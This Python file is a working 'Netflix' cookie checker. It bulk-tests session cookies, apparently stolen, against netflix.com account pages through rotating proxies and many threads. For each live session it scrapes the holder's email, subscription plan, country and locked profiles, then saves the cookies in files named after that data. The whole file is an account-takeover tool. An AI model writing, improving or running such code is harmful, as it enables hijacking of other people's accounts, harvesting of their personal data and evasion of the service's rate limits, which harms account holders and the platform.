import json
import os
import re
import sys
import time
import requests
import tkinter as tk
from tkinter import filedialog
from requests.exceptions import RequestException, ConnectionError
from http.client import RemoteDisconnected
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# ─────────────────────────────────────────────────────────────────────────────
# Init
# ─────────────────────────────────────────────────────────────────────────────
init()

BANNER = f"""{Fore.RED}
███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝
██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝ 
██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗ 
██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝                                       
{Style.RESET_ALL}"""
print(BANNER)
print(Fore.YELLOW + "Initializing, please wait...\n" + Fore.RESET)

# ─────────────────────────────────────────────────────────────────────────────
# Global state
# ─────────────────────────────────────────────────────────────────────────────
working_cookies_path = "working_cookies"
failed_cookies_path = "failed_cookies"  # cookies that failed due to network errors
exceptions = 0
working_cookies = 0
expired_cookies = 0
duplicate_cookies = 0
extra_memberships = 0
processed_cookies = 0
failed_cookies = 0  # network-failed cookies saved for retry
total_cookies = 0
start = time.time()

lock = Lock()
proxy_lock = Lock()
num_threads = 5  # Define the maximum number of threads here

# ───────────────────────────────────────────────────────
# | Network Speed  | Recommended threads                |
# |----------------|-------------------------------------|
# | < 5 Mbps       | 1-3                                |
# | 5-20 Mbps      | 3-5                                |
# | 20-100 Mbps    | 5-10                               |
# | > 100 Mbps     | 10-20                              |
# ───────────────────────────────────────────────────────

max_retries = 3  # Define the maximum number of retries

# Timeout constants (seconds)
REQUEST_TIMEOUT = 20
EXTRA_MEMBER_TIMEOUT = 20
PROFILE_TIMEOUT = 15
PROXY_CHECK_TIMEOUT = 8
RETRY_DELAY = 1

# Proxy globals (populated during setup)
valid_proxies: list = []  # list of {"http": url, "https": url}
proxy_index = 0
USE_PROXY = False


# ─────────────────────────────────────────────────────────────────────────────
# Extraction helpers
# ─────────────────────────────────────────────────────────────────────────────

def decode_hex_escapes(s: str) -> str:
    """Decode \\xNN and \\uNNNN escape sequences safely."""
    if not s:
        return s
    s = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9A-Fa-f]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s


# Module-level constant to avoid re-creating tuple every call
_PROFILE_KEYS = (
    "profiles", "profileList", "profileMap", "profilesList",
    "profileData", "userProfiles", "profileInfo",
)


def extract_info(response_text: str) -> dict:
    """
    Extract plan, email, and country from Netflix's embedded reactContext JSON.
    Tries full JSON parse first, falls back to targeted regex if that fails.
    """
    result = {}

    # ── Strategy 1: Extract and parse the entire reactContext JSON blob ──
    ctx_match = re.search(
        r"reactContext\s*=\s*JSON\.parse\('(.+?)'\)\s*;",
        response_text,
        re.DOTALL,
    )
    if not ctx_match:
        ctx_match = re.search(
            r'id="reactContext"[^>]*>\s*(\{.+?\})\s*</script>',
            response_text,
            re.DOTALL,
        )

    if ctx_match:
        try:
            raw = ctx_match.group(1)
            raw = raw.replace("\\'", "'")
            raw = raw.replace('\\"', '"')
            ctx = json.loads(raw)

            models = ctx.get("models", {})

            # Email -- emailAddress only
            for source in [models.get("userInfo", {}), models.get("user", {}), models, ctx]:
                if isinstance(source, dict):
                    email = source.get("emailAddress")
                    if email:
                        result["emailAddress"] = email
                        break

            # Plan -- actual subscribed plan, check multiple sources ──
            for source in [
                models.get("membership", {}),
                models.get("userMembership", {}),
                models.get("userInfo", {}),
                models.get("account", {}),
                models,
                ctx,
            ]:
                if isinstance(source, dict):
                    plan = (
                        source.get("localizedPlanName")
                        or source.get("planName")
                        or source.get("currentPlan")
                        or source.get("membershipPlan")
                        or source.get("plan")
                    )
                    if plan:
                        # Normalize common plan values
                        plan_lower = str(plan).lower()
                        if "premium" in plan_lower:
                            result["localizedPlanName"] = "Premium"
                        elif "standard" in plan_lower:
                            result["localizedPlanName"] = "Standard"
                        elif "basic" in plan_lower:
                            result["localizedPlanName"] = "Basic"
                        else:
                            result["localizedPlanName"] = str(plan)
                        break

            # Country -- countryOfSignup ONLY (never generic "country")
            for source in [models.get("userInfo", {}), models.get("user", {}), models, ctx]:
                if isinstance(source, dict):
                    country = source.get("countryOfSignup")
                    if country and len(str(country)) == 2:
                        result["countryOfSignup"] = str(country).upper()
                        break

            # Profiles -- count total and locked (PIN-protected) ──
            profiles = None
            for source in [models, models.get("userInfo", {}), models.get("user", {}), ctx]:
                if isinstance(source, dict):
                    for key in _PROFILE_KEYS:
                        p = source.get(key)
                        if isinstance(p, list) and len(p) > 0:
                            profiles = p
                            break
                        if isinstance(p, dict) and len(p) > 0:
                            # Profiles stored as dict: {"guid": {...profile...}, ...}
                            profiles = list(p.values())
                            break
                    if profiles:
                        break
            if profiles:
                result["profileCount"] = len(profiles)
                locked = [
                    p.get("profileName") or p.get("name") or "?"
                    for p in profiles
                    if isinstance(p, dict) and (
                        p.get("isPinLocked") or p.get("isProfileLocked")
                    )
                ]
                result["lockedProfiles"] = locked
            else:
                result["profileCount"] = 0
                result["lockedProfiles"] = []

        except (json.JSONDecodeError, Exception):
            pass

    # ── Strategy 2: Targeted regex fallback ──
    if not result.get("localizedPlanName"):
        # Try multiple patterns for the actual subscribed plan
        plan_found = None
        # Pattern 1: fieldType/value format (e.g. {"fieldType":"String","value":"Premium"})
        m = re.search(
            r'"(?:localizedPlanName|planName|currentPlan|membershipPlan|plan)"\s*:\s*\{\s*'
            r'"fieldType"\s*:\s*"String"\s*,'
            r'\s*"value"\s*:\s*"([^"]+)"',
            response_text,
        )
        if m:
            plan_found = m.group(1)
        if not plan_found:
            # Pattern 2: simple string format (e.g. "localizedPlanName":"Premium")
            m = re.search(
                r'"(?:localizedPlanName|planName|currentPlan)"\s*:\s*"([^"]+)"',
                response_text,
            )
            if m:
                val = m.group(1)
                if len(val) > 3:  # skip short codes
                    plan_found = val
        if plan_found:
            plan_found = decode_hex_escapes(plan_found)
            plan_lower = plan_found.lower()
            if "premium" in plan_lower:
                result["localizedPlanName"] = "Premium"
            elif "standard" in plan_lower:
                result["localizedPlanName"] = "Standard"
            elif "basic" in plan_lower:
                result["localizedPlanName"] = "Basic"
            else:
                result["localizedPlanName"] = plan_found

    if not result.get("emailAddress"):
        # Look for emailAddress INSIDE userInfo block only (not random emailAddress elsewhere)
        m = re.search(
            r'"userInfo"\s*:\s*\{.*?"emailAddress"\s*:\s*"([^"]+)"',
            response_text,
            re.DOTALL,
        )
        if not m:
            # Fallback: simple pattern but with stricter context
            m = re.search(
                r'"(?:emailAddress|email)"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,'
                r'\s*"value"\s*:\s*"([^"]+)"',
                response_text,
            )
        if not m:
            m = re.search(r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"', response_text)
        if m:
            result["emailAddress"] = decode_hex_escapes(m.group(1))

    if not result.get("countryOfSignup"):
        # fieldType format: {"fieldType":"String","value":"TH"}
        m = re.search(
            r'"countryOfSignup"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,'
            r'\s*"value"\s*:\s*"([A-Z]{2})"',
            response_text,
        )
        if not m:
            # simple format: "countryOfSignup":"TH"
            m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', response_text)
        if m:
            result["countryOfSignup"] = m.group(1).upper()

    return result


def load_cookies_from_json(path: str) -> list:
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    # Support both formats:
    #  - New: {"cookies": [...], "_meta": {...}}
    #  - Old: [...] (plain list, possibly with metadata mixed in)
    if isinstance(data, dict) and "cookies" in data:
        return [c for c in data["cookies"] if isinstance(c, dict) and "name" in c and "value" in c]
    if isinstance(data, list):
        return [c for c in data if isinstance(c, dict) and "name" in c and "value" in c]
    return []


# ─────────────────────────────────────────────────────────────────────────────
# Proxy utilities
# ─────────────────────────────────────────────────────────────────────────────

def get_next_proxy() -> dict | None:
    """Return next proxy via round-robin (thread-safe)."""
    global proxy_index
    if not valid_proxies:
        return None
    with proxy_lock:
        p = valid_proxies[proxy_index % len(valid_proxies)]
        proxy_index += 1
    return p


def ask_yes_no(prompt: str) -> bool:
    while True:
        ans = input(prompt + " [y/n]: ").strip().lower()
        if ans in ("y", "yes"):
            return True
        if ans in ("n", "no"):
            return False
        print(Fore.RED + "  Please enter y or n." + Fore.RESET)


def pick_proxy_file() -> str | None:
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    path = filedialog.askopenfilename(
        title="Select proxy file",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
    )
    root.destroy()
    return path or None


def pick_proxy_type() -> str:
    options = {"1": "http", "2": "https", "3": "socks4", "4": "socks5"}
    print(Fore.CYAN + "\nSelect proxy type:" + Fore.RESET)
    for k, v in options.items():
        print(f"  [{k}] {v.upper()}")
    while True:
        choice = input("  Enter number (1-4): ").strip()
        if choice in options:
            return options[choice]
        print(Fore.RED + "  Invalid choice, try again." + Fore.RESET)


def parse_proxy_line(line: str, proxy_type: str) -> str | None:
    """
    Parse a proxy line in any of these formats:
      host:port
      host:port:user:pass
      user:pass@host:port
    Returns a full proxy URL or None if un-parseable.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "@" in line:
        return f"{proxy_type}://{line}"
    parts = line.split(":")
    if len(parts) == 2:
        return f"{proxy_type}://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        host, port, user, passwd = parts
        return f"{proxy_type}://{user}:{passwd}@{host}:{port}"
    return None


def validate_proxy(proxy_url: str, timeout: int = PROXY_CHECK_TIMEOUT) -> bool:
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        r = requests.get("https://www.google.com", proxies=proxies, timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False


def load_and_validate_proxies(filepath: str, proxy_type: str) -> list:
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = f.readlines()

    proxy_urls = [u for u in (parse_proxy_line(l, proxy_type) for l in raw_lines) if u]

    if not proxy_urls:
        print(Fore.RED + "[⚠️]  No parseable proxies found in the file." + Fore.RESET)
        return []

    print(
        Fore.YELLOW
        + f"\n[🔍] Validating {len(proxy_urls)} proxies, please wait..."
        + Fore.RESET
    )

    good = []
    bad_count = 0
    checked_count = 0
    total_count = len(proxy_urls)
    c_lock = Lock()

    def _check(url: str):
        nonlocal bad_count, checked_count
        ok = validate_proxy(url)
        with c_lock:
            checked_count += 1
            if ok:
                good.append({"http": url, "https": url})
                print(Fore.GREEN + f"  [✔] LIVE  — {url}" + Fore.RESET)
            else:
                bad_count += 1
                print(Fore.RED + f"  [✘] DEAD  — {url}" + Fore.RESET)
            # Update terminal title with proxy validation progress
            title_str = f"Netflix | Validating Proxies [{checked_count}/{total_count}] | ✅ Live: {len(good)} | ❌ Dead: {bad_count}"
            if os.name == 'nt':
                import ctypes
                try:
                    ctypes.windll.kernel32.SetConsoleTitleW(title_str)
                except Exception:
                    pass
            else:
                sys.stdout.write(f"\033]0;{title_str}\007")
                sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=min(20, len(proxy_urls))) as ex:
        for _ in as_completed([ex.submit(_check, u) for u in proxy_urls]):
            pass

    print(
        Fore.YELLOW + f"\n[📊] Proxy validation done — "
        + Fore.GREEN + f"{len(good)} live"
        + Fore.YELLOW + " / "
        + Fore.RED + f"{bad_count} dead"
        + Fore.RESET + "\n"
    )
    return good


# ─────────────────────────────────────────────────────────────────────────────
# Proxy setup entry-point
# ─────────────────────────────────────────────────────────────────────────────

def setup_proxies():
    global valid_proxies, USE_PROXY

    if not ask_yes_no(Fore.CYAN + "Do you want to use proxies?" + Fore.RESET):
        print(Fore.YELLOW + "[ℹ️]  Running without proxies.\n" + Fore.RESET)
        return

    print(Fore.CYAN + "\n[📂] A file picker will open — select your proxy list..." + Fore.RESET)
    proxy_file = pick_proxy_file()
    if not proxy_file:
        print(Fore.RED + "[⚠️]  No file selected. Running without proxies.\n" + Fore.RESET)
        return

    print(Fore.GREEN + f"[✔]  Proxy file : {proxy_file}" + Fore.RESET)

    proxy_type = pick_proxy_type()
    print(Fore.GREEN + f"[✔]  Proxy type : {proxy_type.upper()}\n" + Fore.RESET)

    validated = load_and_validate_proxies(proxy_file, proxy_type)
    if not validated:
        print(Fore.RED + "[⚠️]  No live proxies found. Running without proxies.\n" + Fore.RESET)
        return

    valid_proxies = validated
    USE_PROXY = True
    print(Fore.GREEN + f"[✔]  {len(valid_proxies)} live proxies loaded. Proxy mode ON.\n" + Fore.RESET)


# ─────────────────────────────────────────────────────────────────────────────
# Core cookie checker
# ─────────────────────────────────────────────────────────────────────────────

def open_webpage_with_cookies(session, link: str, json_cookies: list, filename: str):
    """Returns (True, plan, email, country, extra_members, profile_count, locked_profiles, None) on success,
    or (False, None, None, None, None, 0, [], reason) on failure (reason = "expired" | "network_error")."""
    global expired_cookies, extra_memberships

    session.cookies.clear()
    for cookie in json_cookies:
        if "name" not in cookie or "value" not in cookie:
            continue  # skip metadata or malformed entries
        session.cookies.set(cookie["name"], cookie["value"])

    session.headers.update({"Accept-Encoding": "identity"})

    # Assign a proxy for this session
    if USE_PROXY:
        proxy = get_next_proxy()
        if proxy:
            session.proxies.update(proxy)

    attempt = 0
    while attempt < max_retries:
        try:
            response = session.get(link, timeout=REQUEST_TIMEOUT)
            response.raise_for_status()
            content = response.text
            info = extract_info(content)
            soup = BeautifulSoup(content, "lxml")

            # Extra-membership probe
            em_resp = session.get(
                "https://www.netflix.com/accountowner/addextramember",
                allow_redirects=False,
                timeout=EXTRA_MEMBER_TIMEOUT,
            )
            if em_resp.status_code == 200:
                with lock:
                    extra_memberships += 1
                extra_members = True
            else:
                extra_members = False

            # Logged-out detection
            if soup.find(string="Sign In") or soup.find(string="Sign in"):
                with lock:
                    print(Fore.RED + f"[❌] Cookie not working — {filename}" + Fore.RESET)
                    expired_cookies += 1
                return (False, None, None, None, None, 0, [], "expired")

            # ── Plan (from reactContext only — most reliable) ──────────────
            raw_plan = info.get("localizedPlanName")
            plan = (
                raw_plan.replace("miembro\xa0extra", "(Shared Extra Member)")
                if raw_plan
                else "Unknown"
            )

            # ── Email (reactContext > CSS selector only) ───────────────────
            raw_email = info.get("emailAddress")
            if raw_email:
                email = raw_email
            else:
                el = soup.select_one(".account-section-email")
                email = el.text.strip() if el else "Unknown"

            # ── Country (reactContext countryOfSignup only) ────────────────
            country = info.get("countryOfSignup") or "Unknown"

            profile_count = info.get("profileCount", 0)
            locked_profiles = info.get("lockedProfiles", [])

            # ── Fetch profiles from /browse if not in /YourAccount ──
            if profile_count == 0:
                try:
                    profiles_resp = session.get(
                        "https://www.netflix.com/browse",
                        timeout=PROFILE_TIMEOUT,
                        allow_redirects=True,
                    )
                    if profiles_resp.status_code == 200:
                        # Try JSON parse first
                        profiles_info = extract_info(profiles_resp.text)
                        profile_count = profiles_info.get("profileCount", 0)
                        locked_profiles = profiles_info.get("lockedProfiles", [])

                        # HTML scrape fallback
                        if profile_count == 0:
                            prof_soup = BeautifulSoup(profiles_resp.text, "lxml")
                            li_items = prof_soup.select("li.profile")
                            profile_count = len(li_items)
                            if li_items:
                                locked_profiles = []
                                for li in li_items:
                                    name_el = li.select_one(".profile-name")
                                    name = name_el.text.strip() if name_el else "?"
                                    if li.select_one("svg.svg-icon-profile-lock"):
                                        locked_profiles.append(name)
                except Exception:
                    pass

            # ── Validate: if ALL data is Unknown, cookie is likely expired ──
            if plan == "Unknown" and email == "Unknown" and country == "Unknown":
                with lock:
                    print(
                        Fore.RED
                        + f"[❌] Cookie loaded but no account data — marking as expired ({filename})"
                        + Fore.RESET
                    )
                    expired_cookies += 1
                return (False, None, None, None, None, 0, [], "expired")

            os.makedirs(working_cookies_path, exist_ok=True)
            return (True, plan, email, country, extra_members, profile_count, locked_profiles, None)

        except (RequestException, ConnectionError, RemoteDisconnected) as e:
            with lock:
                print(
                    Fore.RED
                    + f"[⚠️] Request error: {e!s} — {filename} "
                    + f"(attempt {attempt + 1}/{max_retries})"
                    + Fore.RESET
                )
            attempt += 1
            # Rotate proxy on retry
            if USE_PROXY:
                proxy = get_next_proxy()
                if proxy:
                    session.proxies.update(proxy)
            time.sleep(RETRY_DELAY)

    with lock:
        print(Fore.RED + f"[❌] Network failed after {max_retries} attempts — saved to failed_cookies ({filename})" + Fore.RESET)
    return (False, None, None, None, None, 0, [], "network_error")


def process_cookie_file(filename: str):
    global duplicate_cookies, working_cookies, exceptions, processed_cookies, failed_cookies

    filepath = os.path.join("json_cookies", filename)

    url = "https://www.netflix.com/YourAccount"
    try:
        cookies = load_cookies_from_json(filepath)
        with requests.Session() as session:
            result = open_webpage_with_cookies(session, url, cookies, filename)
            success, plan, email, country, extra_members, profile_count, locked_profiles, failure_reason = result
            if success:
                # Sanitize email for use in filename
                safe_email = re.sub(r'[<>:"/\\|?*]', '_', email or "unknown")
                suffix = " - Extra Membership" if extra_members else ""
                locked_part = (
                    " - Locked-"
                    + re.sub(r'[<>:"/\\|?*]', '_', ", ".join(locked_profiles))
                    if locked_profiles
                    else ""
                )
                profile_part = (
                    f" - Profiles-{profile_count}"
                    if profile_count > 0
                    else ""
                )
                out_name = (
                    f"[ {country} ] - [ {safe_email} ] - {plan}{suffix}"
                    f"{profile_part}{locked_part}.json"
                )
                out_path = os.path.join(working_cookies_path, out_name)

                with lock:
                    if os.path.isfile(out_path):
                        print(
                            Fore.YELLOW
                            + f"[⚠️] Duplicate — {filename} | Plan: {plan} | Email: {email}"
                            + Fore.RESET
                        )
                        duplicate_cookies += 1
                    else:
                        with open(out_path, "w", encoding="utf-8") as jf:
                            json.dump(cookies, jf, indent=4)
                        working_cookies += 1
                        proxy_tag = (
                            f" | Proxy: {session.proxies.get('http', 'n/a')}"
                            if USE_PROXY else ""
                        )
                        print(
                            Fore.GREEN
                            + f"[✔️] Working — [{country}] {filename} | "
                            + f"Plan: {plan} | Email: {email} | "
                            + f"Extra: {extra_members} | "
                            + f"Profiles: {profile_count} | "
                            + f"Locked: {', '.join(locked_profiles) if locked_profiles else 'None'}"
                            + f"{proxy_tag}"
                            + Fore.RESET
                        )

            elif failure_reason == "network_error":
                # Save to failed_cookies for later retry
                os.makedirs(failed_cookies_path, exist_ok=True)
                failed_path = os.path.join(failed_cookies_path, filename)
                with open(failed_path, "w", encoding="utf-8") as jf:
                    json.dump(cookies, jf, indent=4)
                with lock:
                    failed_cookies += 1
                    print(
                        Fore.YELLOW
                        + f"[💾] Saved to failed_cookies/ — {filename} (retry later with better network/proxy)"
                        + Fore.RESET
                    )

    except json.decoder.JSONDecodeError:
        with lock:
            print(
                Fore.RED
                + f"[⚠️] Invalid JSON — use cookie_converter.py to fix ({filename})"
                + Fore.RESET
            )
            exceptions += 1

    except Exception as e:
        with lock:
            print(Fore.RED + f"[⚠️] Error: {e!s} — {filename}" + Fore.RESET)
            exceptions += 1

    finally:
        with lock:
            processed_cookies += 1
            p, t, w, e, ex, fc = processed_cookies, total_cookies, working_cookies, expired_cookies, exceptions, failed_cookies
        update_title(p, t, w, e, ex, fc)


# ─────────────────────────────────────────────────────────────────────────────
# Terminal title updater
# ─────────────────────────────────────────────────────────────────────────────

def update_title(processed: int = 0, total: int = 0, working: int = 0,
                  expired: int = 0, error_count: int = 0, failed: int = 0):
    """Update terminal title with live progress (I/O — caller should NOT hold locks)."""
    emoji_check = "\u2705"   # ✅
    emoji_cross = "\u274C"   # ❌
    emoji_warn = "\u26A0"    # ⚠️
    emoji_retry = "\U0001F504"  # 🔄
    title_str = (
        f"Netflix | [{processed}/{total}] "
        f"| {emoji_check} Work: {working} "
        f"| {emoji_cross} Exp: {expired} "
        f"| {emoji_retry} Retry: {failed} "
        f"| {emoji_warn} Err: {error_count}"
    )
    if os.name == 'nt':
        import ctypes
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title_str)
        except Exception:
            pass  # silently ignore if console title API is unavailable
    else:
        sys.stdout.write(f"\033]0;{title_str}\007")
        sys.stdout.flush()


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    global total_cookies

    # 1. Proxy setup (ask, file-pick, validate) before any checking starts
    setup_proxies()

    # 2. Verify cookie directory
    cookie_dir = "json_cookies"
    if not os.path.isdir(cookie_dir):
        print(
            Fore.RED
            + "[⚠️] 'json_cookies' directory not found.\n"
            + "     Create it and place your JSON cookies inside, then re-run."
            + Fore.RESET
        )
        input(Fore.CYAN + "\nPress Enter to exit..." + Fore.RESET)
        sys.exit(1)

    files = [f for f in os.listdir(cookie_dir) if os.path.isfile(os.path.join(cookie_dir, f))]
    if not files:
        print(
            Fore.RED
            + "[⚠️] 'json_cookies' is empty.\n"
            + "     Use cookie_converter.py to convert your cookies first."
            + Fore.RESET
        )
        input(Fore.CYAN + "\nPress Enter to exit..." + Fore.RESET)
        sys.exit(1)

    total_cookies = len(files)

    if os.path.isdir(working_cookies_path):
        print(
            Fore.YELLOW
            + "[ℹ️]  'working_cookies' already exists — new results will be appended.\n"
            + Fore.RESET
        )
    if os.path.isdir(failed_cookies_path):
        print(
            Fore.YELLOW
            + "[ℹ️]  'failed_cookies' already exists — network-failed cookies will be saved for retry.\n"
            + Fore.RESET
        )

    proxy_info = (
        f"ON ({len(valid_proxies)} live)" if USE_PROXY else "OFF"
    )
    print(
        Fore.CYAN
        + f"[🚀] Starting — {len(files)} cookie(s) | "
        + f"threads: {num_threads} | proxy: {proxy_info}\n"
        + Fore.RESET
    )

    # 3. Run checker
    update_title()
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        executor.map(process_cookie_file, files)


if __name__ == "__main__":
    try:
        main()
        end = time.time()
        elapsed = round(end - start)

        proxy_summary = (
            f"Yes ({len(valid_proxies)} live)" if USE_PROXY else "No"
        )

        print(
            Fore.YELLOW
            + "\n==================================="
            + f"\n  {Fore.LIGHTCYAN_EX}Summary{Fore.YELLOW}"
            + f"\n  Total cookies      : {Fore.CYAN}{total_cookies}{Fore.YELLOW}"
            + f"\n  Working cookies    : {Fore.GREEN}{working_cookies}{Fore.YELLOW}"
            + f"\n  Extra memberships  : {Fore.MAGENTA}{extra_memberships}{Fore.YELLOW}"
            + f"\n  Expired cookies    : {Fore.RED}{expired_cookies}{Fore.YELLOW}"
            + f"\n  Network failed     : {Fore.LIGHTYELLOW_EX}{failed_cookies} (saved in failed_cookies/){Fore.YELLOW}"
            + f"\n  Duplicate cookies  : {Fore.LIGHTYELLOW_EX}{duplicate_cookies}{Fore.YELLOW}"
            + f"\n  Errors / invalid   : {Fore.RED}{exceptions}{Fore.YELLOW}"
            + f"\n  Proxies used       : {Fore.CYAN}{proxy_summary}{Fore.YELLOW}"
            + f"\n  Time elapsed       : {Fore.LIGHTBLACK_EX}{elapsed}s{Fore.YELLOW}"
            + "\n==================================="
            + Fore.RESET
        )
        if failed_cookies > 0:
            print(
                Fore.CYAN
                + "\n💡 Tip: Move files from 'failed_cookies/' to 'json_cookies/' and re-run"
                + "\n    to retry cookies that failed due to network errors!"
                + Fore.RESET
            )
        input(Fore.CYAN + "\nPress Enter to exit..." + Fore.RESET)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[⚠️] Interrupted by user." + Fore.RESET)
        input(Fore.CYAN + "\nPress Enter to exit..." + Fore.RESET)
